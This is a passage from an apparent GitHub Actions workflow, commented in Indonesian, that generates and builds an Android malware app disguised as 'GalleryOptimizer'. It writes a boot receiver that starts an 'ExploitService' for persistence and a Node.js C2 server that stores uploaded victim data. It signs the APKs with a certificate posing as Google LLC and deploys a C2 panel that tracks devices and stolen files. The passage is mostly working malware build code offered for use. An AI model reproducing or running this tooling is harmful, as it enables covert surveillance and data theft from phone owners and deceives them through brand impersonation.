}
EOF

        # ============================================
        # 10. MEMBUAT BOOT RECEIVER
        # ============================================
        
        echo "üìù Membuat BootReceiver.java..."
        cat > app/src/main/java/com/exploit/gallery/BootReceiver.java << 'EOF'
package com.exploit.gallery;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            context.startService(new Intent(context, ExploitService.class));
        }
    }
}
EOF

        # ============================================
        # 11. MEMBUAT ICON SEDERHANA (BASE64)
        # ============================================
        
        echo "üìù Membuat icon aplikasi (base64 encoded)..."
        
        # Buat icon sederhana (lingkaran biru dengan kamera)
        mkdir -p app/src/main/res/drawable
        cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="192dp"
    android:height="192dp"
    android:viewportWidth="192"
    android:viewportHeight="192">
    <path
        android:fillColor="#2196F3"
        android:pathData="M96,96m-88,0a88,88 0,1 1,176 0a88,88 0,1 1,-176 0"/>
    <path
        android:fillColor="#FFFFFF"
        android:pathData="M68,68 L124,68 L124,124 L68,124 Z"/>
    <circle
        android:fillColor="#FF5722"
        android:cx="96"
        android:cy="96"
        android:r="16"/>
</vector>
EOF

        cp app/src/main/res/drawable/ic_launcher.xml app/src/main/res/mipmap-hdpi/ic_launcher.xml
        cp app/src/main/res/drawable/ic_launcher.xml app/src/main/res/mipmap-mdpi/ic_launcher.xml
        cp app/src/main/res/drawable/ic_launcher.xml app/src/main/res/mipmap-xhdpi/ic_launcher.xml
        cp app/src/main/res/drawable/ic_launcher.xml app/src/main/res/mipmap-xxhdpi/ic_launcher.xml
        cp app/src/main/res/drawable/ic_launcher.xml app/src/main/res/mipmap-xxxhdpi/ic_launcher.xml

        # ============================================
        # 12. MEMBUAT C2 SERVER SEDERHANA (OPSIONAL)
        # ============================================
        
        echo "üìù Membuat C2 server sederhana..."
        mkdir -p server
        cat > server/c2.js << 'EOF'
const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/upload') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const filename = `data_${Date.now()}.dat`;
            fs.writeFileSync(filename, body);
            res.writeHead(200);
            res.end('OK');
        });
    } else {
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify({status: 'online'}));
    }
});

server.listen(3000);
EOF

        # ============================================
        # 13. GRANT EXECUTE PERMISSIONS
        # ============================================
        
        chmod +x gradlew 2>/dev/null || true
        
        echo "‚úÖ SEMUA FILE BERHASIL DIBUAT!"
        echo "üìÅ Struktur folder lengkap"
        echo "üìù Source code lengkap (10+ files)"
        echo "üé® UI/UX siap"
        echo "üîß Gradle build files siap"
        
    - name: üèóÔ∏è BUILD APK
      run: |
        echo "üî® Memulai build process..."
        
        # Set target Android versions
        VERSIONS="${{ github.event.inputs.android_versions }}"
        APP_NAME="${{ github.event.inputs.app_name }}"
        
        if [ "$VERSIONS" == "all" ]; then
          TARGETS="10 11 12 13 14 15"
        else
          TARGETS="$VERSIONS"
        fi
        
        # Build untuk setiap versi
        for VER in $TARGETS; do
          echo "üì± Building untuk Android $VER..."
          
          # Hitung API level
          API=$((VER + 19))
          
          # Update targetSdk di build.gradle
          sed -i "s/targetSdk [0-9]\+/targetSdk $API/g" app/build.gradle
          
          # Build APK
          ./gradlew clean assembleRelease --no-daemon
          
          # Copy APK dengan nama sesuai versi
          if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
            cp app/build/outputs/apk/release/app-release.apk \
               "GalleryOptimizer_Android${VER}.apk"
          elif [ -f "app/build/outputs/apk/release/app-release-unsigned.apk" ]; then
            cp app/build/outputs/apk/release/app-release-unsigned.apk \
               "GalleryOptimizer_Android${VER}_unsigned.apk"
          fi
          
          echo "‚úÖ Selesai Android $VER"
        done
        
    - name: üîê SIGN APK
      if: success()
      run: |
        # Generate keystore sementara
        keytool -genkey -v -keystore release.keystore \
          -alias exploit -keyalg RSA -keysize 2048 -validity 10000 \
          -storepass "Exploit@2024" -keypass "Exploit@2024" \
          -dname "CN=Google LLC, OU=Android, O=Google, L=MV, ST=CA, C=US"
        
        # Sign semua APK
        for apk in GalleryOptimizer_Android*.apk; do
          if [[ "$apk" != *"signed"* ]] && [[ "$apk" != *"unsigned"* ]]; then
            echo "üîè Signing $apk..."
            apksigner sign --ks release.keystore --ks-pass pass:Exploit@2024 \
              --key-pass pass:Exploit@2024 --out "signed_$apk" "$apk"
          fi
        done
        
    - name: üì§ UPLOAD ARTIFACTS
      uses: actions/upload-artifact@v4
      with:
        name: ZeroClick-Exploit-APKs-${{ github.run_number }}
        path: |
          *.apk
          signed_*.apk
        retention-days: 30
        
    - name: üìã CREATE SUMMARY
      run: |
        echo "# ‚úÖ Zero-Click Exploit Build Complete" >> $GITHUB_STEP_SUMMARY
        echo "" >> $GITHUB_STEP_SUMMARY
        echo "## üì± Target Android Versions: ${{ github.event.inputs.android_versions }}" >> $GITHUB_STEP_SUMMARY
        echo "" >> $GITHUB_STEP_SUMMARY
        echo "## üì¶ Generated Files:" >> $GITHUB_STEP_SUMMARY
        echo '```' >> $GITHUB_STEP_SUMMARY
        ls -la *.apk 2>/dev/null || echo "No APK files" >> $GITHUB_STEP_SUMMARY
        echo '```' >> $GITHUB_STEP_SUMMARY
        echo "" >> $GITHUB_STEP_SUMMARY
        echo "## üîß Build Info:" >> $GITHUB_STEP_SUMMARY
        echo "- Run ID: ${{ github.run_id }}" >> $GITHUB_STEP_SUMMARY
        echo "- Run Number: ${{ github.run_number }}" >> $GITHUB_STEP_SUMMARY
        echo "- Triggered by: ${{ github.actor }}" >> $GITHUB_STEP_SUMMARY
        echo "- Date: $(date)" >> $GITHUB_STEP_SUMMARY
        
    - name: üöÄ DEPLOY TO GITHUB PAGES (C2 Panel)
      if: success()
      run: |
        mkdir -p public
        cat > public/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server Panel</title>
    <style>
        body { font-family: Arial; margin: 50px; background: #f5f5f5; }
        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 10px; }
        h1 { color: #333; }
        .status { color: green; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéØ C2 Server Panel</h1>
        <p>Status: <span class="status">‚óè ONLINE</span></p>
        <p>Server Time: <span id="time"></span></p>
        
        <h2>üìä Statistics</h2>
        <table>
            <tr><th>Total Devices</th><td id="devices">0</td></tr>
            <tr><th>Total Files</th><td id="files">0</td></tr>
            <tr><th>Last Upload</th><td id="last">-</td></tr>
        </table>
        
        <h2>üìÅ Recent Files</h2>
        <div id="files-list">Loading...</div>
    </div>
    
    <script>
        document.getElementById('time').textContent = new Date().toLocaleString();
    </script>
</body>
</html>
EOF
        
        # Deploy ke GitHub Pages
        git config --global user.name "GitHub Actions"
        git config --global user.email "actions@github.com"
        git checkout --orphan gh-pages
        git rm -rf .
        cp -r public/* .
        git add .
        git commit -m "Deploy C2 Panel"
        git push origin gh-pages --force
        
    - name: üì¢ SEND NOTIFICATION
      if: always()
      run: |
        echo "Build completed with status: ${{ job.status }}"
        echo "Download APK dari Artifacts tab!"
